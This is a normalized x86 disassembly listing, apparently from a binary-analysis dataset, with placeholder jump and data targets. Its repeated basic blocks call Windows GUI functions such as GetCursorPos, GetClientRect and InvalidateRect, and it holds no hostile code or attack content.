mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x12
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edx + edi ]
push eax
lea ecx [ esp + 0x47c ]
call sub_402400
mov [ esp + 0x4e8 ] ebx
lea eax [ esp + 0x478 ]
push eax
lea ecx [ esp + 0x92c ]
mov [ esp + 0x9ac ] 0x1d
call sub_402400
mov ecx [ esp + 0x4e8 ]
mov [ esp + 0x998 ] ecx
lea edx [ esp + 0x928 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x1e
call sub_46c340
lea ecx [ esp + 0x928 ]
call sub_401a90
lea ecx [ esp + 0x478 ]
mov [ esp + 0x9a8 ] 0x1c
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ ecx + esi * 4 ]
cmp eax 0xffffffff
je r-xdata
cmp esi eax
jge r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46c9b0
mov ecx [ esp + 0x24 ]
push ecx
jmp r-xdata
mov edi [ eax ]
cmp edi eax
mov [ esp + 0x10 ] edi
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
cmp eax [ eax ]
mov [ esp + 0x10 ] eax
je r-xdata
mov ebx [ eax ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
inc esi
jmp r-xdata
mov eax [ ebp + eax * 4 ]
mov [ ecx + esi * 4 ] eax
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ ecx + esi * 4 ]
mov eax [ edx + esi * 4 ]
mov [ ecx ] eax
call sub_439ed0
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov ebx rw-data
mov [ esp + 0x14 ] ebx
jmp r-xdata
mov edx [ esi ]
mov eax [ ebx + esi ]
mov ecx [ rw-data ]
inc edi
mov [ ecx + edx * 4 ] eax
add esi 0x4
jmp r-xdata
cmp edi edx
jge r-xdata
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46c730
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46c7b0
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46c830
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46c8b0
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46c930
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
call j_sub_4b66ed#2
add esp 0x4
nop
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46ca30
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46cab0
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
lea ebx [ ebx ]
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46cb30
jmp r-xdata
xor ebx ebx
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x9b4 ] 0x0
call sub_46cbb0
xor ebx ebx
mov [ esp + 0x10 ] edi
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
add eax edx
cmp ebx rw-data
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ eax + ebx ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ eax + ebx + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ eax + ecx + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ eax + ebx ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ eax + ebx + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ eax + ecx + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ eax + ebx ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ eax + ebx + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ eax + ecx + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ eax + ebx ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ eax + ebx + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ eax + ecx + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ eax + ebx ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ eax + ebx + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ eax + ecx + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
lea edx [ edi + 0x10 ]
lea ecx [ eax + ebx ]
push edx
call sub_402540
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0x4 ]
mov [ ecx + ebx + 0x38 ] eax
mov edi [ edi + 0x80 ]
mov [ ebp + edi * 4 ] eax
inc eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
add ebx 0x70
call sub_45f1b0
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
cmp edi eax
jne r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ ebx + eax ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ ebx + eax + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ ecx + eax + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ ebx + eax ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ ebx + eax + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ ecx + eax + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ ebx + eax ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ ebx + eax + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ ecx + eax + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
add edx 0x10
lea ecx [ ebx + eax ]
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov [ ebx + eax + 0x38 ] edi
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] eax
call sub_45f210
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x80 ]
mov [ ebp + eax * 4 ] edi
lea ecx [ esp + 0x10 ]
inc edi
add ebx 0x70
call sub_45f210
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x10 ]
add ecx eax
push edx
call sub_402540
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0x10 ]
mov [ ecx + eax + 0x38 ] edi
mov ebx [ ebx + 0x80 ]
add ecx 0x70
mov [ esp + 0x10 ] ecx
mov [ ebp + ebx * 4 ] edi
lea ecx [ esp + 0x18 ]
inc edi
call sub_45f1b0
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov edi edx
mov edx esi
sub edx edi
mov edi [ ebx + 0x8 ]
cmp edi ecx
ja r-xdata
cmp esi eax
je r-xdata
mov ebx [ ebx + 0x4 ]
mov ecx [ ebx + ecx * 4 ]
mov edx [ ecx + edx * 4 ]
lea ecx [ ebp + edx * 4 ]
mov [ esp + 0x18 ] ecx
lea edx [ eax * 4 ]
mov ecx esi
sub ecx edx
cmp edi eax
ja r-xdata
sub ecx edi
mov eax [ esp + 0x24 ]
test eax eax
mov [ esp + 0x9a8 ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ ebx + eax * 4 ]
mov edx [ edx ]
mov ebx [ esp + 0x14 ]
mov [ eax + ecx * 4 ] edx
inc esi
jmp r-xdata
sub eax edi
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_483370
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c131f
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x790
push ebx
push ebp
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ rw-data ] edi
jg r-xdata
push eax
call sub_45b5d0
add esp 0x4
mov ebp eax
push rw-data
mov [ esp + 0x20 ] ebp
call [ GetCursorPos@IAT ]
cmp [ rw-data ] 0x1c
mov esi [ Sleep@IAT ]
mov ebx [ esp + 0x7bc ]
jne r-xdata
cmp eax 0xc
jl r-xdata
cmp [ rw-data ] 0x1d
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ rw-data ]
push ebx
push eax
push edi
mov ecx rw-data
call sub_401150
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push eax
push edx
push edi
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov ecx rw-data
call sub_404310
cmp ebp 0x4
je r-xdata
lea esp [ esp ]
cmp ebp 0x4
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx rw-data
call sub_403ab0
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov ecx rw-data
call sub_403ab0
mov [ esp + 0x70 ] rw-data
jmp r-xdata
push 0x64
call esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp eax 0xc
jge r-xdata
cmp ebp 0x4
mov ecx rw-data
jne r-xdata
push 0x64
call esi
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ esp + 0x70 ] rw-data
push eax
call j_sub_4b66ed#2
add esp 0x4
mov al [ esp + 0x17 ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x34 ] al
call sub_432c20
mov [ esp + 0x38 ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ esp + 0x38 ]
mov [ eax + 0x4 ] eax
mov eax [ esp + 0x38 ]
mov [ eax ] eax
mov eax [ esp + 0x38 ]
mov [ eax + 0x8 ] eax
mov [ esp + 0x3c ] edi
mov esi [ rw-data ]
or ebx 0xffffffff
cmp esi 0xc
mov [ esp + 0x7a8 ] edi
mov [ rw-data ] ebx
jge r-xdata
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
call sub_43d760
mov ecx rw-data
cmp esi 0x1d
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x24 ] ecx
jmp r-xdata
cmp [ rw-data ] 0x10
mov ebp [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
push edi
mov [ rw-data ] ecx
mov ecx [ rw-data ]
push edi
push ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] 0x3f800000
call [ InvalidateRect@IAT ]
mov ecx rw-data
call sub_404310
mov al [ rw-data ]
test al al
setne dl
mov ecx rw-data
mov [ rw-data ] dl
call sub_401420
mov eax 0x1
jmp r-xdata
cmp esi 0x1c
je r-xdata
mov [ esp + 0x78 ] edi
mov [ esp + 0x7c ] edi
mov [ esp + 0x80 ] edi
cmp [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ esp + 0x7a8 ] 0x1
jae r-xdata
mov al [ esp + 0x7b8 ]
test al al
jne r-xdata
mov ecx rw-data
xor ebx ebx
call sub_4010c0
test eax eax
jle r-xdata
mov ebp rw-data
mov ebp rw-data
jmp r-xdata
mov ebp [ rw-data ]
jmp r-xdata
mov ecx [ esp + 0x7a0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x79c
retn
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
cmp ebp 0x4
mov ebp eax
jne r-xdata
push esi
mov ecx rw-data
call sub_402510
mov edx [ rw-data ]
push edx
lea eax [ esp + 0x78 ]
push eax
push esi
lea ecx [ esp + 0x13c ]
call sub_403030
lea ecx [ esp + 0x130 ]
push ecx
mov [ esp + 0x7ac ] 0x2
mov [ esp + 0x158 ] 0x2
call sub_4090d0
add esp 0x4
cmp eax edi
jge r-xdata
mov esi rw-data
mov ecx [ esp + 0x70 ]
mov [ rw-data ] 0x0
call sub_43d760
mov ecx [ rw-data ]
push 0xfffffff0
push ecx
call [ GetWindowLongA@IAT ]
lea edx [ esp + 0xc4 ]
mov esi eax
mov eax [ rw-data ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ebp [ GetSystemMetrics@IAT ]
push 0x2
call ebp
mov edi eax
push 0x3
mov [ esp + 0x34 ] edi
call ebp
mov ebx [ esp + 0xcc ]
sub ebx [ esp + 0xc4 ]
test esi 0x200000
mov [ esp + 0x90 ] eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov ebp [ esp + 0x1c ]
imul ebp ebp 0x12c
mov eax [ ebp + rw-data ]
test al 0xf
mov [ esp + 0x28 ] ebp
jne r-xdata
xor esi esi
jmp r-xdata
sar ebp 0x2
mov al [ ebp + rw-data ]
test al al
jne r-xdata
sar ebp 0x2
mov al [ ebp + rw-data ]
test al al
jne r-xdata
mov edx [ rw-data ]
push edx
lea eax [ esp + 0x78 ]
push eax
call sub_481f30
mov esi [ esp + 0x80 ]
mov eax [ esp + 0x84 ]
add esp 0x8
cmp esi eax
je r-xdata
mov ecx rw-data
call sub_401420
lea ecx [ esp + 0x130 ]
call sub_401a00
lea ecx [ esp + 0x74 ]
call sub_403b20
lea ecx [ esp + 0x34 ]
mov [ esp + 0x7a8 ] ebx
call sub_475190
jmp r-xdata
mov ecx [ esp + 0xd0 ]
sub ecx [ esp + 0xc8 ]
test esi 0x100000
mov [ esp + 0x10 ] ecx
je r-xdata
add ebx edi
mov [ esp + 0x18 ] ebx
cmp esi 0x1d
je r-xdata
cmp esi 0x1c
jne r-xdata
mov edx [ rw-data ]
lea eax [ esi + edx ]
push rw-data
push eax
call sub_4013c0
add esp 0x8
test al al
jne r-xdata
lea ebx [ ebp + ebp * 2 ]
lea eax [ esp + 0x6c ]
shl ebx 0x2
push eax
lea ecx [ ebx + rw-data ]
call sub_4209f0
mov ebp [ eax ]
cmp ebp [ ebx + rw-data ]
je r-xdata
push edi
push ebp
call sub_4221d0
mov esi [ rw-data ]
add esp 0x8
lea ecx [ ebp + ebp * 2 ]
mov edx [ ecx * 4 + rw-data ]
jmp r-xdata
push edi
push ebp
call sub_4221d0
mov esi [ rw-data ]
add esp 0x8
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
add esi 0x4
mov ebp 0x10
mov esi [ rw-data ]
cmp esi 0xc
jge r-xdata
add ecx eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
cmp esi 0x1c
mov [ esp + 0x7a8 ] 0x4
jne r-xdata
cmp esi 0xb
je r-xdata
mov [ rw-data ] ebx
mov eax [ rw-data ]
add eax esi
push ebp
push eax
call sub_401380
add esp 0x8
test al al
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
mov esi 0x10
mov [ esp + 0x24 ] edx
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x24 ] edx
mov [ esp + 0x24 ] edi
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edi [ esp + 0x24 ]
mov edi [ rw-data ]
mov [ esp + 0x24 ] edi
jmp r-xdata
cmp esi 0x1d
je r-xdata
mov eax [ esp + 0x7bc ]
lea edx [ eax + 0x1 ]
cmp esi 0x1c
je r-xdata
mov ecx rw-data
inc ebx
add esi 0x1c
call sub_4010c0
cmp ebx eax
jl r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x24 ] edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx esi
jb r-xdata
mov ecx rw-data
call sub_4010c0
mov [ rw-data ] eax
lea ecx [ esp + 0x130 ]
call sub_401a00
lea ecx [ esp + 0x74 ]
mov [ esp + 0x7a8 ] 0x0
call sub_403b20
mov esi [ rw-data ]
jmp r-xdata
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x88 ] esp
push ebx
call sub_4024d0
call sub_401530
add esp 0x1c
cmp eax 0x6
jne r-xdata
test [ esi + 0x18 ] 0x10
jne r-xdata
mov edx [ rw-data ]
cmp edx ebp
mov ecx [ rw-data ]
jne r-xdata
mov ecx rw-data
call sub_401420
cmp [ esp + 0x1c ] 0x4
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebp
jne r-xdata
xor ebp ebp
cmp edi ebp
jne r-xdata
test al 0x20
je r-xdata
cmp esi 0xb
je r-xdata
